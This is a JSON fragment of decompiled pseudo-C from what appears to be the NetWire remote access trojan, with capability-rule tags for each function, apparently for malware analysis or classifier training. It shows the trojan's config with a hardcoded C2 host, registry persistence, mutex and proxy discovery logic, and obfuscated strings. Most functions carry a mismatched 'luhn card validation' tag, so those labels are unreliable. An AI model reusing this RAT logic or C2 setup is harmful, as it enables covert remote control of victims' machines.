        "decompiled_code": "\nuint fcn.00407d7f(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    bool bVar8;\n    uint8_t auStack1052 [1036];\n    \n    fcn.004129e4(auStack1052, 0, 0x400);\n    fcn.004129e4(param_2, 0, param_3);\n    uVar3 = sub.KERNEL32.dll_GetCommandLineA();\n    fcn.00412548(auStack1052, uVar3, 0x400);\n    iVar6 = 0;\n    iVar4 = 0;\ncode_r0x00407de4:\n    do {\n        uVar2 = auStack1052[iVar4];\n        if (uVar2 == 0) {\n            return 0;\n        }\n        if (uVar2 == 0x22) {\n            iVar5 = iVar4 + 1;\n            iVar7 = 0;\n            while ((uVar2 = auStack1052[iVar5],  uVar2 != 0x22 && (uVar2 != 0))) {\n                iVar5 = iVar5 + 1;\n                iVar7 = iVar7 + 1;\n                *((param_2 - iVar4) + -2 + iVar5) = uVar2;\n            }\n            *(param_2 + iVar7) = 0;\n        }\n        else {\n            if (uVar2 == 0x20) {\n                iVar4 = iVar4 + 1;\n                param_1 = param_1 + 1;\n                goto code_r0x00407de4;\n            }\n            iVar5 = iVar4;\n            while( true ) {\n                puVar1 = auStack1052 + iVar5;\n                if ((*puVar1 & 0xdf) == 0) break;\n                iVar5 = iVar5 + 1;\n                *((param_2 - iVar4) + -1 + iVar5) = *puVar1;\n            }\n            *(param_2 + (iVar5 - iVar4)) = 0;\n        }\n        bVar8 = param_1 == iVar6;\n        iVar6 = iVar6 + 1;\n        if (bVar8) {\n            return 1;\n        }\n        iVar4 = iVar5 + 1;\n    } while( true );\n}\n",
        "token_count": 555
    },
    "00407e8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00407e8c(uint param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int16_t aiStack16 [6];\n    \n    iVar1 = sub.msvcrt.dll_fopen(param_1, 0x422f58);\n    uVar2 = 0;\n    if (iVar1 != 0) {\n        iVar3 = sub.msvcrt.dll_fread(aiStack16, 1, 4, iVar1);\n        if (iVar3 == 4) {\n            uVar2 = sub.msvcrt.dll_fclose(iVar1);\n            uVar2 = uVar2 & 0xffffff00 | aiStack16[0] == 0x5a4d;\n        }\n        else {\n            sub.msvcrt.dll_fclose(iVar1);\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 206
    },
    "00407ef4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.00407ef4(uint param_1)\n\n{\n    sub.KERNEL32.dll_Sleep(param_1);\n    return;\n}\n",
        "token_count": 31
    },
    "00407f08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00407f08(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uchar auStack16 [16];\n    \n    iVar1 = sub.msvcrt.dll__beginthreadex(0, 0, param_1, param_2, 0, auStack16);\n    if (iVar1 != 0) {\n        sub.KERNEL32.dll_CloseHandle(iVar1);\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 103
    },
    "00407f59": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407f59(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        sub.msvcrt.dll_free(*param_1);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 56
    },
    "00407f7a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407f7a(uint param_1)\n\n{\n    sub.KERNEL32.dll_LoadLibraryA(param_1);\n    return;\n}\n",
        "token_count": 33
    },
    "00407f8e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407f8e(uint param_1, uint param_2)\n\n{\n    sub.KERNEL32.dll_GetProcAddress(param_1, param_2);\n    return;\n}\n",
        "token_count": 41
    },
    "00407fab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407fab(int32_t param_1)\n\n{\n    if (0 < param_1) {\n        sub.KERNEL32.dll_FreeLibrary(param_1);\n    }\n    return;\n}\n",
        "token_count": 44
    },
    "00408218": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00408218(uint param_1, uint param_2, char param_3)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uchar *puVar3;\n    ushort uStack78;\n    ushort uStack76;\n    uchar auStack74 [2];\n    ushort uStack72;\n    ushort uStack70;\n    ushort uStack68;\n    ushort uStack66;\n    uchar auStack62 [46];\n    \n    fcn.004129e4(param_1, 0, param_2);\n    if (param_3 == '\\0') {\n        sub.KERNEL32.dll_GetLocalTime(auStack74);\n    }\n    else {\n        sub.KERNEL32.dll_GetSystemTime();\n    }\n    puVar2 = 0x422360;\n    puVar3 = auStack62;\n    for (iVar1 = 0x1e; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    fcn.004127a8(param_1, param_2, auStack62, uStack78, uStack76, uStack72, uStack70, uStack68, uStack66);\n    return;\n}\n",
        "token_count": 292
    },
    "004082c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004082c4(uint param_1, uint param_2)\n\n{\n    fcn.00412548(param_1, 0x422f6d, param_2);\n    return;\n}\n",
        "token_count": 47
    },
    "004082e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.004082e8(uint32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00412666(0x4223e0);\n    return uVar1 & param_1 & 0xffffff00 | (uVar1 & param_1) == param_1;\n}\n",
        "token_count": 77
    },
    "00408417": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00408417(void)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    code *pcVar7;\n    uint *puVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    uint extraout_ECX;\n    uchar *puVar11;\n    uchar *puVar12;\n    char **ppcVar13;\n    char **ppcVar14;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    char *pcVar15;\n    uint unaff_EDI;\n    uint *puVar16;\n    char *pcVar17;\n    ulong uVar18;\n    uint uStack44;\n    int32_t aiStack40 [3];\n    char *apcStack28 [3];\n    \n    apcStack28[2] = 0x408425;\n    iVar4 = fcn.0041f3f0();\n    iVar4 = -iVar4;\n    *(&stack0xfffffff0 + iVar4) = \"U4R-55sTsdR\";\n    *(&stack0xffffffec + iVar4) = 0x408433;\n    uVar5 = fcn.004081aa();\n    *(&stack0xfffffff0 + iVar4) = \"winhttp.dll\";\n    *(&stack0xffffffec + iVar4) = 0x408441;\n    uVar6 = sub.KERNEL32.dll_LoadLibraryA();\n    *(&stack0xffffffec + iVar4) = unaff_ESI;\n    *(&stack0xfffffff0 + iVar4) = uVar5;\n    *(&stack0xffffffec + iVar4) = uVar6;\n    *(&stack0xffffffe8 + iVar4) = 0x40844e;\n    pcVar7 = sub.KERNEL32.dll_GetProcAddress();\n    *(&stack0xffffffe8 + iVar4) = unaff_EDI;\n    *(&stack0xffffffe4 + iVar4) = unaff_EDI;\n    *(&stack0xffffffe4 + iVar4) = \"U4R-55sEd590WfZ_W0u0i\";\n    *(&stack0xffffffe0 + iVar4) = 0x40845e;\n    uVar5 = fcn.004081aa();\n    *(&stack0xffffffe4 + iVar4) = \"winhttp.dll\";\n    *(&stack0xffffffe0 + iVar4) = 0x40846c;\n    uVar6 = sub.KERNEL32.dll_LoadLibraryA();\n    *(&stack0xffffffe0 + iVar4) = unaff_EBP;\n    *(&stack0xffffffe4 + iVar4) = uVar5;\n    *(&stack0xffffffe0 + iVar4) = uVar6;\n    *(&stack0xffffffdc + iVar4) = 0x408479;\n    uVar18 = sub.KERNEL32.dll_GetProcAddress();\n    uVar5 = uVar18 >> 0x20;\n    *(&stack0xffffffdc + iVar4) = uVar5;\n    *(&stack0xffffffd8 + iVar4) = uVar5;\n    ppcVar13 = &stack0xffffffd8 + iVar4;\n    if ((pcVar7 != NULL) && (ppcVar13 = &stack0xffffffd8 + iVar4,  uVar18 != NULL)) {\n        puVar8 = L\"InternetProxy\";\n        puVar16 = &stack0x00000050 + iVar4;\n        for (iVar10 = 7; iVar10 != 0; iVar10 = iVar10 + -1) {\n            *puVar16 = *puVar8;\n            puVar8 = puVar8 + 1;\n            puVar16 = puVar16 + 1;\n        }\n        *(&stack0xffffffe8 + iVar4) = 0;\n        *(&stack0xffffffe4 + iVar4) = 0;\n        *(&stack0xffffffe0 + iVar4) = 0;\n        *(&stack0xffffffdc + iVar4) = 1;\n        *(&stack0xffffffd8 + iVar4) = &stack0x00000050 + iVar4;\n        *(&stack0x00000004 + iVar4) = 0;\n        puVar11 = &stack0xffffffd4 + iVar4;\n        *(&stack0xffffffd4 + iVar4) = 0x4084ca;\n        iVar4 = (*pcVar7)();\n        ppcVar13 = puVar11 + -0x14;\n        if (iVar4 != 0) {\n            uVar5 = *(puVar11 + 0x18);\n            puVar8 = puVar11 + 0x4c;\n            for (iVar10 = 6; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar8 = uVar5;\n                puVar8 = puVar8 + 1;\n            }\n            *(puVar11 + 0x4c) = 1;\n            *(puVar11 + 0x50) = 3;\n            *(puVar11 + 0x60) = 1;\n            puVar8 = puVar11 + 0x40;\n            for (iVar10 = 3; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar8 = uVar5;\n                puVar8 = puVar8 + 1;\n            }\n            puVar8 = L\"http://www.yandex.com\";\n            puVar16 = puVar11 + 0x80;\n            for (iVar10 = 0xb; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar16 = *puVar8;\n                puVar8 = puVar8 + 1;\n                puVar16 = puVar16 + 1;\n            }\n            *(puVar11 + -0xc) = puVar11 + 0x4c;\n            *(puVar11 + -8) = puVar11 + 0x40;\n            *(puVar11 + -0x14) = iVar4;\n            *(puVar11 + -0x10) = puVar11 + 0x80;\n            puVar12 = puVar11 + -0x18;\n            *(puVar11 + -0x18) = 0x40853a;\n            iVar4 = (*uVar18)();\n            ppcVar13 = puVar12 + -0x10;\n            if (iVar4 != 0) {\n                *(puVar12 + -8) = 0x422fa2;\n                puVar1 = puVar12 + 0x3c;\n                *(puVar12 + -0xc) = 0x1000;\n                puVar2 = puVar12 + 0xb0;\n                *(puVar12 + -4) = *(puVar12 + 0x48);\n                *(puVar12 + -0x10) = puVar12 + 0xf0;\n                *(puVar12 + -0x14) = 0x408577;\n                fcn.004127a8();\n                *(puVar12 + -8) = 0x1000;\n                *(puVar12 + -0xc) = 0x422f70;\n                *(puVar12 + -0x10) = puVar12 + 0xf0;\n                *(puVar12 + -0x14) = 0x408596;\n                fcn.00412588();\n                *(puVar12 + -4) = puVar1;\n                *(puVar12 + -8) = puVar2;\n                puVar12[0x2f] = 0x68;\n                puVar12[0x30] = 0x74;\n                *(puVar12 + -0xc) = puVar12 + 0x2f;\n                puVar12[0x31] = 0x74;\n                puVar12[0x32] = 0x70;\n                puVar12[0x33] = 0x3d;\n                *(puVar12 + -0x10) = puVar12 + 0xf0;\n                puVar12[0x34] = 0;\n                *(puVar12 + -0x14) = 0x4085d3;\n                cVar3 = fcn.00408306();\n                if (cVar3 != '\\0') {\n                    *(puVar12 + -0x10) = 0x8c;\n                    *(puVar12 + -0x14) = 0x4085e3;\n                    puVar8 = sub.msvcrt.dll_malloc();\n                    *(puVar12 + -8) = 0x40;\n                    *(puVar12 + -0xc) = puVar2;\n                    *(puVar12 + -0x10) = puVar8 + 1;\n                    *(puVar12 + -0x14) = 0x4085fc;\n                    fcn.00412548();\n                    *puVar8 = 3;\n                    *(puVar12 + -0x10) = puVar1;\n                    *(puVar12 + -0x14) = 0x40860a;\n                    uVar5 = fcn.00412666();\n                    puVar8[0x11] = uVar5;\n                    puVar8[0x22] = *0x42b304;\n                    *0x42b304 = puVar8;\n                    *(puVar12 + -8) = 4;\n                    *(puVar12 + -0xc) = 0x422fa5;\n                    *(puVar12 + -0x10) = 0x4223dc;\n                    *(puVar12 + -0x14) = 0x40863a;\n                    fcn.00412548();\n                }\n                pcVar15 = \"socks=\";\n                pcVar17 = puVar12 + 0x35;\n                for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *pcVar17 = *pcVar15;\n                    pcVar15 = pcVar15 + 1;\n                    pcVar17 = pcVar17 + 1;\n                }\n                *(puVar12 + -4) = puVar1;\n                *(puVar12 + -8) = puVar2;\n                *(puVar12 + -0xc) = puVar12 + 0x35;\n                *(puVar12 + -0x10) = puVar12 + 0xf0;\n                *(puVar12 + -0x14) = 0x408669;\n                cVar3 = fcn.00408306();\n                ppcVar13 = puVar12 + -0x10;\n                if (cVar3 != '\\0') {\n                    *(puVar12 + -0x10) = 0x8c;\n                    *(puVar12 + -0x14) = 0x40867d;\n                    puVar8 = sub.msvcrt.dll_malloc();\n                    *(puVar12 + -8) = 0x40;\n                    *(puVar12 + -0xc) = puVar2;\n                    *(puVar12 + -0x10) = puVar8 + 1;\n                    *(puVar12 + -0x14) = 0x408696;\n                    fcn.00412548();\n                    *puVar8 = 0;\n                    *(puVar12 + -0x10) = puVar1;\n                    *(puVar12 + -0x14) = 0x4086a4;\n                    uVar5 = fcn.00412666();\n                    puVar8[0x11] = uVar5;\n                    puVar8[0x22] = *0x42b304;\n                    *0x42b304 = puVar8;\n                    *(puVar12 + -0x10) = 0x8c;\n                    *(puVar12 + -0x14) = 0x4086c4;\n                    puVar8 = sub.msvcrt.dll_malloc();\n                    *(puVar12 + -8) = 0x40;\n                    *(puVar12 + -0xc) = puVar2;\n                    *(puVar12 + -0x10) = puVar8 + 1;\n                    *(puVar12 + -0x14) = 0x4086dd;\n                    fcn.00412548();\n                    *puVar8 = 2;\n                    *(puVar12 + -0x10) = puVar1;\n                    *(puVar12 + -0x14) = 0x4086eb;\n                    uVar5 = fcn.00412666();\n                    puVar8[0x11] = uVar5;\n                    puVar8[0x22] = *0x42b304;\n                    *0x42b304 = puVar8;\n                    *(puVar12 + -8) = 4;\n                    *(puVar12 + -0xc) = 0x422fa5;\n                    *(puVar12 + -0x10) = 0x4223dc;\n                    *(puVar12 + -0x14) = 0x40871b;\n                    fcn.00412548();\n                    ppcVar13 = puVar12 + -0x10;\n                }\n            }\n        }\n    }\n    *ppcVar13 = \"U4R-55sEd5Xj90WfZPWR84n_W0PQ00dR5u6d0\";\n    ppcVar13[-1] = 0x408727;\n    uVar5 = fcn.004081aa();\n    *ppcVar13 = \"winhttp.dll\";\n    ppcVar13[-1] = 0x408735;\n    uVar6 = sub.KERNEL32.dll_LoadLibraryA();\n    ppcVar13[-1] = extraout_ECX;\n    *ppcVar13 = uVar5;\n    ppcVar13[-1] = uVar6;\n    ppcVar13[-2] = 0x408742;\n    pcVar7 = sub.KERNEL32.dll_GetProcAddress();\n    ppcVar13[-2] = uVar5;\n    ppcVar13[-3] = uVar5;\n    if (pcVar7 != NULL) {\n        ppcVar13[-3] = 0x10;\n        ppcVar13[-4] = 0x40875a;\n        iVar4 = sub.msvcrt.dll_malloc();\n        ppcVar13[-3] = iVar4;\n        ppcVar14 = ppcVar13 + -4;\n        ppcVar13[-4] = 0x408761;\n        uVar18 = (*pcVar7)();\n        ppcVar14[-1] = uVar18 >> 0x20;\n        if (uVar18 != 0) {\n            uVar5 = *(iVar4 + 8);\n            ppcVar14[1] = 0x422fa2;\n            puVar8 = ppcVar14 + 0x12;\n            *ppcVar14 = 0x1000;\n            puVar16 = ppcVar14 + 0x2f;\n            ppcVar14[2] = uVar5;\n            ppcVar14[-1] = ppcVar14 + 0x3f;\n            ppcVar14[-2] = 0x40879b;\n            fcn.004127a8();\n            ppcVar14[1] = 0x1000;\n            *ppcVar14 = 0x422f70;\n            ppcVar14[-1] = ppcVar14 + 0x3f;\n            ppcVar14[-2] = 0x4087ba;\n            fcn.00412588();\n            ppcVar14[2] = puVar8;\n            ppcVar14[1] = puVar16;\n            *(ppcVar14 + 0x1d) = 0x68;\n            *(ppcVar14 + 0x75) = 0x74;\n            *ppcVar14 = ppcVar14 + 0x1d;\n            *(ppcVar14 + 0x76) = 0x74;\n            *(ppcVar14 + 0x77) = 0x70;\n            *(ppcVar14 + 0x1e) = 0x3d;\n            ppcVar14[-1] = ppcVar14 + 0x3f;\n            *(ppcVar14 + 0x79) = 0;\n            ppcVar14[-2] = 0x4087f7;\n            cVar3 = fcn.00408306();\n            if (cVar3 != '\\0') {\n                ppcVar14[-1] = 0x8c;\n                ppcVar14[-2] = 0x408807;\n                puVar9 = sub.msvcrt.dll_malloc();\n                ppcVar14[1] = 0x40;\n                *ppcVar14 = puVar16;\n                ppcVar14[-1] = puVar9 + 1;\n                ppcVar14[-2] = 0x408820;\n                fcn.00412548();\n                *puVar9 = 3;\n                ppcVar14[-1] = puVar8;\n                ppcVar14[-2] = 0x40882e;\n                uVar5 = fcn.00412666();\n                puVar9[0x11] = uVar5;\n                puVar9[0x22] = *0x42b304;\n                *0x42b304 = puVar9;\n                ppcVar14[1] = 0x4;\n                *ppcVar14 = 0x422fa5;\n                ppcVar14[-1] = 0x4223dc;\n                ppcVar14[-2] = 0x40885e;\n                fcn.00412548();\n            }\n            pcVar15 = \"socks=\";\n            puVar9 = ppcVar14 + 0x24;\n            for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar9 = *pcVar15;\n                pcVar15 = pcVar15 + 1;\n                puVar9 = puVar9 + 1;\n            }\n            ppcVar14[2] = puVar8;\n            ppcVar14[1] = puVar16;\n            *ppcVar14 = ppcVar14 + 0x24;\n            ppcVar14[-1] = ppcVar14 + 0x3f;\n            ppcVar14[-2] = 0x408893;\n            cVar3 = fcn.00408306();\n            if (cVar3 != '\\0') {\n                ppcVar14[-1] = 0x8c;\n                ppcVar14[-2] = 0x4088a7;\n                puVar9 = sub.msvcrt.dll_malloc();\n                ppcVar14[1] = 0x40;\n                *ppcVar14 = puVar16;\n                ppcVar14[-1] = puVar9 + 1;\n                ppcVar14[-2] = 0x4088c0;\n                fcn.00412548();\n                *puVar9 = 2;\n                ppcVar14[-1] = puVar8;\n                ppcVar14[-2] = 0x4088ce;\n                uVar5 = fcn.00412666();\n                puVar9[0x11] = uVar5;\n                puVar9[0x22] = *0x42b304;\n                *0x42b304 = puVar9;\n                ppcVar14[-1] = 0x8c;\n                ppcVar14[-2] = 0x4088ee;\n                puVar9 = sub.msvcrt.dll_malloc();\n                ppcVar14[1] = 0x40;\n                *ppcVar14 = puVar16;\n                ppcVar14[-1] = puVar9 + 1;\n                ppcVar14[-2] = 0x408907;\n                fcn.00412548();\n                *puVar9 = 0;\n                ppcVar14[-1] = puVar8;\n                ppcVar14[-2] = 0x408915;\n                uVar5 = fcn.00412666();\n                puVar9[0x11] = uVar5;\n                puVar9[0x22] = *0x42b304;\n                *0x42b304 = puVar9;\n                ppcVar14[1] = 0x4;\n                *ppcVar14 = 0x422fa5;\n                ppcVar14[-1] = 0x4223dc;\n                ppcVar14[-2] = 0x408945;\n                fcn.00412548();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 4598
    },
    "00408950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00408950(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    uchar auStack1044 [516];\n    uchar auStack528 [520];\n    \n    iVar3 = 0;\n    while( true ) {\n        iVar1 = iVar3 + 1;\n        cVar2 = fcn.00407d7f(iVar3, auStack1044, 0x204);\n        if ((cVar2 != '\\0') && (iVar3 = fcn.004127f3(0x422fcd, auStack1044, 2),  iVar3 == 0)) break;\n        iVar3 = iVar1;\n        if (iVar1 == 4) {\n            return;\n        }\n    }\n    cVar2 = fcn.00407d7f(iVar1, auStack528, 0x204);\n    if (cVar2 == '\\0') {\n        return;\n    }\n    cVar2 = fcn.00406f1a(auStack528);\n    if (cVar2 != '\\0') {\n        fcn.00406e04();\n        return;\n    }\n    cVar2 = fcn.0040729c(auStack528);\n    if (cVar2 == '\\0') {\n        return;\n    }\n    fcn.00407ba7(auStack528);\n    return;\n}\n",
        "token_count": 304
    },
    "004089ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004089ed(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uchar auStack528 [528];\n    \n    cVar1 = fcn.004082e8(8);\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.004081aa(\"MT_qUDrj\\\\F4Y0W6W85\\\\U4RSWg6\\\\PQ00dR5zd064WR\\\\rQR\\\\\");\n        fcn.00410803(0x80000001, uVar2, 0x4224c8);\n    }\n    cVar1 = fcn.004082e8(0x10);\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.004081aa(\"MT_qUDrj\\\\F4Y0W6W85\\\\DY542d Md5Qs\\\\XR65CiidS PWlsWRdR56\");\n        fcn.0041086b(0x80000002, uVar2, 0x4224a0);\n    }\n    cVar1 = fcn.004082e8(4);\n    if ((cVar1 != '\\0') && (*0x42b460 != 0)) {\n        sub.msvcrt.dll_fclose(*0x42b460);\n    }\n    fcn.0041086b(0x80000001, \"SOFTWARE\\\\\", \"NetWire\");\n    fcn.00407c77(auStack528, 0x204);\n    return;\n}\n",
        "token_count": 337
    },
    "00408ab3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00408ab3(void)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    \n    uVar1 = sub.KERNEL32.dll_CreateMutexA(0, 1, 0x422564);\n    bVar2 = true;\n    *0x4223d4 = uVar1;\n    if (uVar1 != 0) {\n        uVar1 = sub.KERNEL32.dll_GetLastError();\n        bVar2 = uVar1 != 0xb7;\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 130
    },
    "00408af3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00408af3(void)\n\n{\n    if (*0x4223d4 != 0) {\n        sub.KERNEL32.dll_ReleaseMutex(*0x4223d4);\n        sub.KERNEL32.dll_CloseHandle(*0x4223d4);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "00408b1a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00408b1a(void)\n\n{\n    uchar auStack276 [272];\n    \n    fcn.00410390(auStack276, 0x4225a8, 0x10);\n    fcn.0041049b(auStack276, \"podzeye.duckdns.org:3360;\", 0xff);\n    fcn.0041049b(auStack276, 0x422600, 0xff);\n    fcn.0041049b(auStack276, \"oluchi\", 0x20);\n    fcn.0041049b(auStack276, \"HostId-akIsiy\", 0x27);\n    fcn.0041049b(auStack276, 0x422564, 8);\n    fcn.0041049b(auStack276, 0x4224e0, 0x80);\n    fcn.0041049b(auStack276, 0x4224c8, 0x10);\n    fcn.0041049b(auStack276, 0x4224a0, 0x26);\n    fcn.0041049b(auStack276, 0x422400, 0x80);\n    fcn.0041049b(auStack276, 0x4223e0, 3);\n    fcn.0041049b(auStack276, 0x4223dc, 3);\n    fcn.0041049b(auStack276, 0x4223d8, 3);\n    return;\n}\n",
        "token_count": 346
    },
    "00408e53": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00408e53(void)\n\n{\n    fcn.00412666(0x4223dc);\n    return;\n}\n",
        "token_count": 30
    },
    "00408e66": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00408e66(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00412666(0x4223d8);\n    return iVar1 * 1000;\n}\n",
        "token_count": 50
    },
    "00408e7f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00408e7f(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t iVar4;\n    uchar auStack44 [32];\n    \n    iVar1 = param_1 + 4;\n    iVar2 = param_1 + 0x24;\n    fcn.004129e4(param_1, 0, 0x44);\n    cVar3 = fcn.004106bd(0x80000001, \"SOFTWARE\\\\NetWire\", \"HostId\", iVar1, 0x28);\n    if ((cVar3 == '\\0') ||\n       (cVar3 = fcn.004106bd(0x80000001, \"SOFTWARE\\\\NetWire\", \"Install Date\", iVar2, 0x20),  cVar3 == '\\0')) {\n        fcn.00408218(auStack44, 0x20, 1);\n        iVar4 = fcn.004125de(0, \"%Rand%\", \"HostId-akIsiy\");\n        if (-1 < iVar4) {\n            fcn.00410322(\"HostId-akIsiy\" + iVar4, 6);\n        }\n        fcn.00412548(iVar1, \"HostId-akIsiy\", 0x20);\n        fcn.00412548(iVar2, auStack44, 0x20);\n        cVar3 = fcn.00410608(0x80000001, \"SOFTWARE\\\\NetWire\", \"HostId\", 1, iVar1);\n        if (cVar3 != '\\0') {\n            fcn.00410608(0x80000001, \"SOFTWARE\\\\NetWire\", \"Install Date\", 1, iVar2);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 397
    },
    "00408fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00408fe0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uchar auStack2076 [516];\n    uchar auStack1560 [516];\n    uchar auStack1044 [516];\n    uchar auStack528 [516];\n    \n    cVar1 = fcn.00407c77(auStack2076, 0x204);\n    if (cVar1 != '\\0') {\n        fcn.00412d73(0x4224e0, auStack1560, 0x204);\n        cVar1 = fcn.004082e8(1);\n        if (cVar1 != '\\0') {\n            iVar2 = fcn.00412861(auStack1560, auStack2076);\n            if (iVar2 != 0) {\n                iVar2 = 8;\n                do {\n                    fcn.00406e04(auStack1560);\n                    cVar1 = fcn.00406f1a(auStack1560);\n                    if (cVar1 != '\\0') {\n                        fcn.00407ef4(1000);\n                    }\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n                cVar1 = fcn.00407b16(auStack1560);\n                if (cVar1 != '\\0') {\n                    cVar1 = fcn.00407302(auStack2076, auStack1560);\n                    if (cVar1 != '\\0') {\n                        cVar1 = fcn.004082e8(2);\n                        if (cVar1 == '\\0') {\n                            fcn.004129e4(auStack528, 0, 0x204);\n                        }\n                        else {\n                            fcn.004127a8(auStack528, 0x204, \"-m \\\"%s\\\"\", auStack2076);\n                        }\n                        cVar1 = fcn.00406f1a(auStack1560);\n                        if (cVar1 != '\\0') {\n                            fcn.00406c2a(auStack1560, auStack528, 1);\n                            goto code_r0x0040912d;\n                        }\n                    }\n                }\n            }\n        }\n        cVar1 = fcn.004082e8(2);\n        if (cVar1 != '\\0') {\n            fcn.00408950();\n        }\n        cVar1 = fcn.00408ab3();\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.004082e8(0x20);\n            if (cVar1 != '\\0') {\ncode_r0x0040912d:\n    // WARNING: Subroutine does not return\n                sub.KERNEL32.dll_ExitProcess(0);\n            }\n        }\n        cVar1 = fcn.004082e8(0x200);\n        if (cVar1 != '\\0') {\n            fcn.00408417();\n        }\n        cVar1 = fcn.004082e8(8);\n        if (cVar1 != '\\0') {\n            uVar3 = fcn.004081aa(\"MT_qUDrj\\\\F4Y0W6W85\\\\U4RSWg6\\\\PQ00dR5zd064WR\\\\rQR\\\\\");\n            fcn.00410608(0x80000001, uVar3, 0x4224c8, 1, auStack2076);\n        }\n        cVar1 = fcn.004082e8(0x10);\n        if (cVar1 != '\\0') {\n            uVar3 = fcn.004081aa(\"MT_qUDrj\\\\F4Y0W6W85\\\\DY542d Md5Qs\\\\XR65CiidS PWlsWRdR56\\\\%6\");\n            fcn.004127a8(auStack1044, 0x204, uVar3, 0x4224a0);\n            fcn.004127a8(auStack528, 0x204, 0x4230b2, auStack2076);\n            uVar3 